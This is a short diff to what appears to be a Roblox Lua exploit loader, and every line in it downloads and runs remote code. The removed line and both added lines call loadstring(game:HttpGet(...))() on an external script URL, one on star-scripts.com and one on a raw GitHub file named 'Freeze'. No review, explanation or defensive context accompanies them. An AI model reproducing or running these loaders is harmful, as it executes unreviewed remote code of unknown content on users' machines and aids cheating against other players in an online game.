@@ -1,1 +1,2 @@
-loadstring(game:HttpGet("https://star-scripts.com/api/run/KVXHJJ4sulEtOwA4bvDuKRDqOESQVZX7"))()
+RUN_AFTER=loadstring(game:HttpGet("https://star-scripts.com/api/run/KVXHJJ4sulEtOwA4bvDuKRDqOESQVZX7"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ThunderModz/Freeze/refs/heads/main/Freeze"))()
